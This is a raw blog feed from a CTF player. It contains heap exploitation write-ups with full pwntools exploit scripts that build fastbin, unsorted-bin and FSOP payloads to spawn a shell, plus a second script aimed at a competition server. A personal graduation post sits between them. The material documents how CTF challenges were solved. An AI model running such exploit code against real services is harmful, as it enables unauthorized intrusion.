class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">context(log_level = <span class="string">"debug"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></div><div class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#5</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#6</span></div><div class="line">    free(<span class="number">1</span>)</div><div class="line">    free(<span class="number">2</span>)</div><div class="line"><span class="comment"># over lap</span></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p8(<span class="number">0xc0</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#1</span></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># leak heap</span></div><div class="line">    </div><div class="line">    free(<span class="number">5</span>)</div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x61</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    heap_addr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x120</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"heap_addr = "</span>+hex(heap_addr)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc</span></div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0xc1</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    <span class="comment">#raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x50)</span></div><div class="line">    </div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line">    main_area = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    libc_base = main_area - <span class="number">0x3a5678</span></div><div class="line">    </div><div class="line">    libc.address = libc_base</div><div class="line"></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x58</span>)<span class="comment">#7</span></div><div class="line">    alloc(<span class="number">0x30</span>)<span class="comment">#8</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#9</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#10</span></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x61</span>+<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">5</span>,<span class="string">"\x00"</span>*(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>+<span class="number">0x60</span>+<span class="number">0x40</span>))</div><div class="line"></div><div class="line">    free(<span class="number">6</span>)</div><div class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#4</span></div><div class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</div><div class="line">    <span class="comment"># print "b*"+hex(0x7CE9A+libc_base)</span></div><div class="line">    <span class="comment"># print util.proc.pidof(r)</span></div><div class="line"></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># unsorted bin attack </span></div><div class="line">    payload  = <span class="string">"\x00"</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>)+p64(main_area)+p64(libc_base+<span class="number">0x3A6040</span><span class="number">-0x10</span>)</div><div class="line">    payload  = payload.ljust(<span class="number">0x100</span><span class="number">-0x50</span>,<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line">    data = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x101</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</div><div class="line">    data = data.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">    data = data.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(heap_addr+<span class="number">0x30</span>*<span class="number">4</span>+<span class="number">0x10</span>+len(payload+data)<span class="number">-0x18</span>+<span class="number">8</span>)</div><div class="line">    data += p64(libc.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line">    </div><div class="line">    fill(<span class="number">4</span>,payload+data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line"></div><div class="line">    </div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10))</span></div><div class="line"></div><div class="line">    <span class="comment"># print "IO_LIST="+hex(libc_base+0x3C5600)</span></div><div class="line">    <span class="comment"># alloc(0x58)#4</span></div><div class="line">    <span class="comment"># alloc(0x20)#7</span></div><div class="line">    <span class="comment"># alloc(0x20)#8</span></div><div class="line">    <span class="comment"># free(4)</span></div><div class="line">    </div><div class="line">    <span class="comment"># fill(3,p64(0)*5+p64(0x71))</span></div><div class="line">    <span class="comment"># fill(2, p64(libc.symbols['__malloc_hook']-0x23))</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x58)#9</span></div><div class="line">    <span class="comment"># alloc(0x58)</span></div><div class="line">    <span class="comment"># alloc(0x30)#10</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># payload  = '\x00'*3</span></div><div class="line">    <span class="comment"># payload += p64(0)*2</span></div><div class="line">    <span class="comment"># payload += p64(libc_base + 0x41374)</span></div><div class="line">    <span class="comment"># fill(6, payload)</span></div><div class="line"></div><div class="line">    <span class="comment"># alloc(255)</span></div><div class="line"></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</div><div class="line">        exploit(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = process([<span class="string">'./fastbin'</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">        </div><div class="line">        exploit(r)</div></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/104144.html</a> （Linux堆内存管理深入分析（上））<br><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">http://www.freebuf.com/articles/security-management/105285.html</a> （Linux堆内存管理深入分析（下））</p><p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> （浅析Linux堆溢出之fastbin）</p><p><a href="http://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="external">http://www.cnblogs.com/shangye/p/6268981.html</a> （ house of orange ）</p><p><a href="http://www.bitscn.com/network/hack/200607/30235.html" target="_blank" rel="external">http://www.bitscn.com/network/hack/200607/30235.html</a> （ FSO 利用 ）</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;涉及到的知识点&quot;&gt;&lt;a href=&quot;#涉及到的知识点&quot; class=&quot;headerlink&quot; title=&quot;涉及到的知识点&quot;&gt;&lt;/a&gt;涉及到的知识点&lt;/h3&gt;&lt;p&gt;1、fastbin attack&lt;/p&gt;
&lt;p&gt;2、unsorted bin attack&lt;/p&gt;
&lt;p&gt;3、malloc堆内存管理&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap" scheme="https://winter3un.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>墨色的五月</title>
    <link href="https://winter3un.github.io/2017/06/03/%E5%A2%A8%E8%89%B2%E7%9A%84%E4%BA%94%E6%9C%88/"/>
    <id>https://winter3un.github.io/2017/06/03/墨色的五月/</id>
    <published>2017-06-03T15:20:53.000Z</published>
    <updated>2017-10-21T06:54:15.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又是很久没更新博客了，毕竟我比较懒 = =。。。</p><p>这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。</p><p>最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。</p><p>比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。</p><p>总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。</p><p>1、 加强数据流量分析能力（应对铁人三项，参考科赛</p><p>2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习</p><a id="more"></a><p>一直以来喜欢低调，喜静，喜欢自己默默做自己的事情，可能与我自身性格有关吧。今后也同样如此，沉心静气。</p><h3 id="5月的碎碎念"><a href="#5月的碎碎念" class="headerlink" title="5月的碎碎念"></a>5月的碎碎念</h3><p>大学四年的最后一个月了，今后就要步入职场，而我基本上也完成了我进这所学院时的初衷，在这所大学建立一个安全团队，为对安全技术有兴趣的人提供一个平台（当然这些事，我一个人肯定是完成不了的，多亏了斯进老师一直以来的支持，最想感谢的人就是她啦）。大学这四年谈过一次恋爱，虽然短短3个月，不过至少这门必修课给我个及格分吧ORZ。做过一些科研，虽然很难去坚持做（毕竟懒癌晚期患者，没救了）。拿过一些比赛的最高名次，其实CTF比赛不难的，心态和运气才是关键（hhhhhhhh），接下来也要做一些ctf比赛的总结了（我竟然从没做过ORZ 。 说实话这个月在临安不用集合真的是太爽了= =。。。   也是到了该离开的时候了，团队已经带起来了，师弟们的实力都很棒（团队里都是男生，我也很绝望啊，期待有个对网络安全感兴趣的女生加入吧，女黑客ORZ）。今后的话，会一直对二进制进行研究，这是我的强项，虽然工作上可能web为主吧，不过无所谓了。</p><h3 id="一些未更新的wp"><a href="#一些未更新的wp" class="headerlink" title="一些未更新的wp"></a>一些未更新的wp</h3><p>1、cuit writeup （看下web题</p><p>2、0ctf writeup</p><p>3、堆溢出的总结</p><h3 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h3><p>1、刷完pwnable</p><p>2、刷完最近的web赛题</p><p>3、深入web代码审计</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;又是很久没更新博客了，毕竟我比较懒 = =。。。&lt;/p&gt;
&lt;p&gt;这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。&lt;/p&gt;
&lt;p&gt;最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。&lt;/p&gt;
&lt;p&gt;比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。&lt;/p&gt;
&lt;p&gt;总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。&lt;/p&gt;
&lt;p&gt;1、 加强数据流量分析能力（应对铁人三项，参考科赛&lt;/p&gt;
&lt;p&gt;2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习&lt;/p&gt;
    
    </summary>
    
    
      <category term="note" scheme="https://winter3un.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】2017-429final</title>
    <link href="https://winter3un.github.io/2017/04/27/2017-429-final/"/>
    <id>https://winter3un.github.io/2017/04/27/2017-429-final/</id>
    <published>2017-04-28T06:24:59.000Z</published>
    <updated>2017-04-29T05:16:31.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>下次pwn选手真的不该去429线下。。这BGM神TM的= =。。</p><p>比赛很稳，主队拿了第7，分队第12，不过需要反思的是：</p><p>1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）</p><p>2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。</p><p>3、写好的exp脚本交由负责流量审计的队友来维护</p><p>4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。</p><p>5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag</p><p>6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。</p><p>7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手</p><p>8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ</p><p>进入主题吧</p><a id="more"></a><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>第一个开放的题目是pwn2，9点开放的比赛，我在10点10分左右已经将具体利用思路构思完毕（静态分析30分钟+动态分析40分钟），坑爹的是对libc文件进行分析的时候（因为我需要拿到free_hook的地址），IDA无法静态分析，这边消耗了两个小时，写完exp的时候已经是领盒饭12点了。。别人利用这个pwn2已经打了至少18轮，900分。。</p><p>pwn2是一个具有off by one和常规溢出漏洞的二进制程序，他创建的虚表结构如下</p><p>PTR[0]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p><p>PTR[1]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p><p>回过头我们看下这个二进制程序 Hashcode 的input函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">sub_4009DB</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Bh] [bp-5h]@2</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    v3 = getchar();</div><div class="line">    <span class="keyword">if</span> ( i == a2 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> i;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>记得大一教我C语言的老师说过，C下标的索引是从0开始的,所以a[len(a)]=0 这样的形式会造成1个\x00字节越界赋值。正常来说，这样1个\x00字节，最多覆盖下一个虚表结构的preg_size的结构，但是存在另一个溢出漏洞，我们可以将hashcode的长度可输入长度进行修改（注意，hashcode的可输入区域长度没有变化），这便造成了越界溢出，溢出的数据覆盖到了下一个ptr虚表，利用过程如下（这个利用过程其实没有用到off by one）。</p><ul><li>以下版本没有用off by one 漏洞</li></ul><p>1、创建四个0x20的hashcode</p><p>2、修改ptr[0]的hacode length 0x20至0x40</p><p>3、覆盖ptr[1]表项，复写ptr[1]表项的hashcode length至我们可以复写ptr[2]表项指向hashcode的指针，复写name指针，利用其我们可以泄露出libc地址。</p><p>4、list出所有ptr表项，得到libc地址</p><p>5、复写下下一个ptr表项指向hashcode指针，使其指向libc bss段上的free_hook，然后调用edit hashcode，修改 free_hook使其指向system</p><p>^以上的供读者自己实现，哈哈哈哈哈哈，我用的是比较麻烦的一个版本</p><p>用到off by one 的版本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 18:28:36</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn2"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.22"</span></div><div class="line">port = <span class="number">5009</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line">elf = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line">gdb.attach(p,<span class="string">"b*0x400C73\nc"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 1 add hashcode 0x20 id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 2 add hashcode 0x20 id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"><span class="comment">## end add hashcode 0x20 id 2</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 3 change hashcode length id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" hash type\n"</span>)</div><div class="line">sl(<span class="string">"sha256"</span>) <span class="comment">#change length 0x20 to 0x40</span></div><div class="line"></div><div class="line"><span class="comment">## stage 4 edit hashcode</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span><span class="number">-1</span>)+p64(<span class="number">0</span>)</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 5 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 6 leak system addr </span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div 